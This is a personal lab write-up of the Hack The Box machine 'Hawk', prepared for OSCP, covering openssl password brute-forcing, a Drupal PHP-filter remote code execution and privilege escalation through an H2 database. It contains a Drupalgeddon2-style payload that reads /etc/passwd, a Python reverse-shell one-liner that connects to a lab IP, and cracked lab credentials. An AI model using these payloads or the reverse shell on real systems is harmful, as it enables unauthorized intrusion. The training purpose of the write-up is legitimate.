
Name: Hawk
Date:  30/11/2022
Difficulty:  Medium
Goals:  OSCP - Became part of the 12 hour brutal self assessment as scripting for a hour and a half or this is a Helped-Through with added yikes so on the cards otherwise
Learnt:
- Better weird file drilling the method
- Some more xdotool is a cool extra to my life I should try use at some point 
- Drawning eletronic pictures is go for reporting, but pen and paper is supreme speed solving utility
- Do stuff till last argement:`$?` does not equal 0; `... > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi;`

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Hawk/Screenshots/ping.png)

FTP - has .drupal.txt.enc
![](ftpgrab.png)

![](ftp-drupal-txt-enc.png)

![](decode.png)

Removed `\n` newlines from the decoded-drupalDOTtxt.txt - Check 7900 Drupal7

![](charsbreakstdout.png)

robot.txt - includes, misc, modules, profiles - see screenshots and robots.txt in this directory.

![](testadminprofile.png)

Checked themes/chocolate, profile/admin to test what the site was using for 
![](cronDOTphp.png)
![](errorpagetestingtwo.png)
![](testadminprofile.png)


![](drupalversion.png)

![](leadstoupdatedotphp.png)
Potentially find access to update the site maliciously 
![](updatescript.png)

![](sqlitelighting.png)

What an exploit name!
![](drupalgeddon3.png)
So metasploit is possible and [python2 exploit](https://github.com/sl4cky/CVE-2018-7600/blob/master/Drupalgeddon2.py), for OSCP compliance and readying!
Both require authentication, so cracking the drupal.txt.enc properly seems the intended path.

Nikto finds a web.config with some rules page name requests and page handling, aswell a rule for pages to then display if parameterised
![](webDOTconfig.png)

Fuzz the ?q=FUZZ, but corss check with robots.txt, see curled version.
![](robots.txt.png)

Manual toying with the exploits
```php
user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax

Data%3dform_id%3duser_register_form%26_drupal_ajax%3d1%26mail[%23post_render][]%3dexec%26mail[%23type]%3dmarkup%26mail[%23markup]%3d<%3fphp+eval('cat+/etc/passwd')php>
// The above failed
```

[[cache-poisoning-fuzz-http___10.129.95.193__9cd019c40b46d1dcffde94fa825ce5a2=1]]

I forget to screenshot and potentially check
![](filethefileidiot.png)

Peeking at [0xDF](https://0xdf.gitlab.io/2018/11/30/htb-hawk.html#encrypted-file---brute-with-bash), I need to write a script presummably for the salt. My brain is chickening when I do not know something. I need to put this to one side and try another box.

Returning to script my heart out to lay waste to openssl the cryptographic headache that has spoiled my momentuum in several CTFs. And because I am actually going to be calm and slow time for making problem solving pictures.

```
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```

Practicing a old problem solving technique from programing challenges till I found the repository for bruteforcing the file after *one* round of base64 decoding. [bruteforce-salted-openssl](https://github.com/glv2/bruteforce-salted-openssl) tries to find the apssword of a file thaty was enrypted with 'openssl' command. If this becomes a Helped-through post cracking the password or fail at cracking it then the *"forfeit"* is to learn C threading for an hour. As a bash script could probably just:

```bash
passwords=$(cat rockyou.txt)
for pass in $passwords; do
	openssl enc -aes-256-cbc -d -a -in $file.enc -out file.txt
		xdotool type '$pass'
		xdotool key Return
done
```

![2000](Hawk-Decoding-Section)


```bash
cat d.txt.enc | base64 -d deb64Pass.txt
git clone https://github.com/glv2/bruteforce-salted-openssl.git
cd bruteforce-salted-openssl
./autogen.sh
./configure
make 
# Original attempt
./bruteforce-salted-openssl -t 4 -1 '../deb64Pass.txt' 
# Working
...
```

Four hours of other activities in the foreground. No crack. 30 minutes threading in C forfeit, peak at solution move on to priv escalation for 40 minutes urgent privilege escalation, before 20 minutes if required, Helped-Throughed. Peaked at 0xDf

```bash
cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi; done;
```

The important scripting lesson here writing the conditional and devnull to pass stderr to null.
`... > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi;`. Although this never work the bash scripting ideas was worth testing it and will be added to my notes on Useful Bash. [Python2 tool to bruteforce openssl ciphers against a wordlists bvy HrushikeshK](https://github.com/HrushikeshK/openssl-bruteforce)

```bash
python openssl-bruteforce/brute.py /usr/share/wordlists/rockyou.txt  openssl-bruteforce/ciphers.txt .drupal.txt.enc 2> /dev/null
```

![](cracked.png)

## Exploit

Armed with:
```go
Password found with algorithm AES256: friends
Data:
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

From this point on I want to see if I can speed through this RCE without metasploit and privesc in forty-ish minutes, I am still going to set this to Helped-Through becuase picked the wrong tool and the script failed. Although I have found the RCE from prior needing help, I starred and follow the tool maker and think my recon for this box was stellar - cracking very subpar. Openssl, javascript and be as throughout the first time paralelled with nice linear task management is getting there.

`admin : PencilKeyboardScanner123`
![](admin-password.png)

Baby step thinking out the exploit if python for one day exploit writing
```python
import requests 


uri_path = http://10.129.95.193/
drupal_node = 1
drupal_session = # cookie 
payload_enc
"{uri_path}/?q=node/#{drupal_node}/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=php%20-r%20'#{payload_enc}"
```

[Find the node number](https://ostraining.com/blog/drupal/find-node-id/)
![](nodenumber.png)
[Python3 Exploit](https://github.com/oways/SA-CORE-2018-004) 
-  Returns .html, but my guess is that - testing with tcpdump is that the sites directory make the off-the-shelf-exploit not produce a RCE.

An 1.5 hour of figgling around; Lesson dithering on the exploits. 

- Lesson head battering ramming a OSCP mindset that is there is an exploit for this it must work once you configure it. Unfortunately configuring the exploit is a rabbithole. Both:

[rana-khalil](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/more-challenging-than-oscp/hawk-writeup-w-o-metasploit#cd9a)
[[Raj Chandel](https://www.hackingarticles.in/author/admin/)](https://www.hackingarticles.in/hack-the-box-hawk-walkthrough/)

It is configure the drupal. - Takeaway continue with making vm hosting drupal. [This seems insane](https://www.drupal.org/docs/7/core/modules/php), but apparently you can just press the RCE me button it is drupal core module - was removed in [drupal 8](https://www.drupal.org/docs/core-modules-and-themes).  ![](evalphp.png)

Unfortunately not saving the configuration makes me not a security risk. A part of me must really want stop myself making poor security choices. 

![](testingrceOne.png)
and the result; weird that daniel and data users are not present.
![](testingrceTwo.png)

## Foothold

Using port 21 to be more OSCP ready.
![](shwithwwwdata.png)

What the hell is agentx?
 ![](agentxdirectory.png)

## PrivEsc

/var/www/html/sites/default/settings.php
$drupal_hash_salt = 'LrDo0zR-UKwhAUPsDYm5qD-RaI-Llu5kJM8XLF8ZYpg
drupal4hawk
![](daniel.png)

We are in a python3.6 environment, which we can just escape with python reverse shell.
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.109",8083));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

[Agentx protocol](https://docs.oracle.com/cd/E19253-01/817-3155/auto33/index.html) - The AgentX protocol enables subagents to connect to the master agent. The protocol also enables the master agent to distribute received SNMP protocol messages to the subagents.

The AgentX protocol defines an SNMP agent to consist of one master agent entity and other subagent entities. The master agent runs on the SNMP port, and sends and receives SNMP messages as specified by the SNMP framework documents. The master agent does not access the subagents' management information directly. The subagents do not handle SNMP messages, but subagents do access their management information. In short, the master agent handles SNMP for the subagents, and **only** handles SNMP. The subagent handles manipulation of management data but does not handle SNMP messages. The responsibilities of each type of agent are strictly defined. The master agent and subagents communicate through AgentX protocol messages. AgentX is described in detail by RFC 2741. See [http://www.ietf.org/rfc/rfc2741.txt](http://www.ietf.org/rfc/rfc2741.txt)

Ran linpeas.sh - CVE-2021-4034, but no cc, make or gcc.

![](rootprocesses.png)
ldap on linux?
![](ldaponlinux.png)

![](dnseh.png)
internal dns and mysql
![](deniedmysql.png)

![](weirddns.png)

![](optdir.png)
[/opt/lshell](https://github.com/ghantoos/lshell) is just the restricted shell.

![](rootdoingphpstuff.png)

sessionclean - a script to cleanup stale PHP sessions
![](sessioncleancode.png)

[stackoverflow](https://serverfault.com/questions/511609/why-does-debian-clean-php-sessions-with-a-cron-job-instead-of-using-phps-built) *"Because Debian sets very stringent permissions on `/var/lib/php5` (1733, owner root, group root) to prevent PHP session hijacking. Unfortunately, this also prevents the native PHP session garbage collector from working, because it can't see the session files there. The cron job runs as root, which does have sufficient access to see and clean up the session files."*

Default functionality.


Failed after and hour, but PrivEsc without help, peaked at writeup, failing was due to again not be throughtout and check current processes. I havve either lots of failures or successes with services and pspy is awesome, but maybe that means I forget the static `ps -aux`. h2 in /opt is root owned, so youcant do anything with it also. So I had pieces either biases and that pspy showing running processes per minute so I was dazzled by the phpsession spawning. 
![1000](failedbutnotlost.png)

[H2](http://www.h2database.com/html/main.html)

![](noremotewebaccess.png)

I don't think I would have tried tunnelling with ssh, but that is the method
```bash
ssh daniel@10.10.10.10 -L 8082:localhost:8082
```

![](connections.png)

If I had screenshot the 8082 I would maybe had this in mind. Also I added to my list of how to think about conenctions I need to be broader than just chisel in thinking. Anyway it is root owned so credentials wont work. We can read files with [H2](http://www.h2database.com/javadoc/org/h2/tools/Backup.html), which is also very un OSCP like as the intended path must end with root shell. I was pensive and frustated at myself I just followed allow 
 with [0xdf](https://0xdf.gitlab.io/2018/11/30/htb-hawk.html#enumeration-1).

For some time it have tried to instill a problem solving mindset that is what is consider a hacking mindset it frustrates me that it has taken much longer to instill  this how can I make x system do something it is  not intended to to do. This problem I have tried to solve with contextualisation, research into intended design, tools, OSes. I think I naively I have more architecture problem solving that lent itself to building and coding - partly why hacking is so important to me as that it an extension to thinking. I know I need to ask more questions, am I more curious, but either my noting is not organised due to time or returning to these boxes. Tonight I am going to do another couple of CTFs and really pause and question system ->  result *"hacker mindset"* and problem solving mindset. And try to write down in some philosphical way in relation to probelm solving that I know I actually got ok at - programming. 